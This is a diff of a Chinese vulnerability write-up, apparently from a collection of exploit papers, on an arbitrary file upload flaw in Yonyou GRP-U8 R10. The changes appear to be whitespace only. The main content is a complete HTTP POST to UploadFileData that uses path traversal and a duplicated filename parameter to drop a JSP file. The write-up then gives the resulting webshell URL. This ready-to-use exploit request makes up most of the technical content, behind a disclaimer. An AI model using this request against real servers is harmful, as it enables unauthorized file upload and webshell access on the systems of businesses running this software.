@@ -8,7 +8,7 @@ source: "MrWQ/vulnerability-paper"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OEk9Muj5-QobFjslNxplVA)
 
-用友 GRP-U8 存在任意文件上传漏洞 
+用友 GRP-U8 存在任意文件上传漏洞 
 =====================
 
 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。
@@ -34,7 +34,7 @@ CNVD 编号:
 3. 影响版本
 -------
 
-用友 GRP-U8R10 
+用友 GRP-U8R10 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpaTTj11QjH4IvgnNa8FZPvicHkMMOmHdIowiaMiafkQBow4ia2hLhxfkcdVA/640?wx_fmt=png)
 
@@ -49,21 +49,21 @@ app="用友 - GRP-U8"
 漏洞数据包：
 
 ```
-POST http://127.0.0.1/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg HTTP/1.1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
-Accept-Encoding: gzip, deflate
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Connection: keep-alive
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
-Content-Type: multipart/form-data
-Upgrade-Insecure-Requests: 1
-Content-Length: 177
+POST http://127.0.0.1/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Connection: keep-alive
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
+Content-Type: multipart/form-data
+Upgrade-Insecure-Requests: 1
+Content-Length: 177
 
 --ec126a48c5b7676dce1b676f5251358f
-Content-Disposition: form-data; 
+Content-Disposition: form-data; 
 
-<% out.println("3135168535");%>
+<% out.println("3135168535");%>
 --ec126a48c5b7676dce1b676f5251358f--
 
 
@@ -71,7 +71,7 @@ Content-Disposition: form-data; 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpa9VZLpV6pst5MXENicalOrn5tmI9uy48Mkd7DhapVvg1JSQic0X2PhLwA/640?wx_fmt=png)
 
- 上传成后 webshell 地址：http://127.0.0.1/R9iPortal/94156577.jsp
+ 上传成后 webshell 地址：http://127.0.0.1/R9iPortal/94156577.jsp
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpaUw6smsms1JYxI6uauAo2eTrl6yjNcNaz093W3Bpu8TuFlBlDcln0Iw/640?wx_fmt=png)
 
